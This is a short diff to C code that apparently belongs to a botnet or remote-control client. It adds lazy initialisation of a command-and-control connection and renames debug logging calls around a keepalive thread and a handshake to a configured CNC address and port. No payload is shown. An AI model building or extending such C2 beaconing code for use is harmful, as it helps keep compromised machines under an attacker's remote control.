@@ -23,6 +23,9 @@
 static cnc_conn *conn;
 
 cnc_conn *get_cnc_conn() {
+    if (conn == NULL) {
+        init_cnc_connection();
+    }
     return conn;
 }
 
@@ -34,12 +37,12 @@ bool is_cnc_connected() {
 }
 
 void *cnc_conn_keepalive() {
-    debug_printf("Starting keepalive thread %d", pthread_self());
+    debug_log("Starting keepalive thread %d", pthread_self());
 
     while (is_cnc_connected()) {
         int64_t unixTime = get_sys_milliseconds();
 
-        debug_printf("Sending keepalive packet %lld", unixTime);
+        debug_log("Sending keepalive packet %lld", unixTime);
 
         if (!write_packet((Packet) {
                 .type = PacketTypeKeepAlive,
@@ -55,7 +58,7 @@ void *cnc_conn_keepalive() {
         SLEEP(45);
     }
 
-    debug_printf("KeepAlive Thread exiting %d", pthread_self());
+    debug_log("KeepAlive Thread exiting %d", pthread_self());
     pthread_exit(NULL);
 
     return NULL;
@@ -133,7 +136,7 @@ bool cnc_conn_open() {
     }
 
     pthread_create(&conn->keepalive_thread, NULL, cnc_conn_keepalive, NULL);
-    debug_printf("Connected to %s:%d @ %p", CNC_ADDR, strtol(CNC_PORT, NULL, 10), conn);
+    debug_log("Connected to %s:%d @ %p", CNC_ADDR, strtol(CNC_PORT, NULL, 10), conn);
 
     if (write_packet((Packet) {
             .type = PacketTypeHandshake,
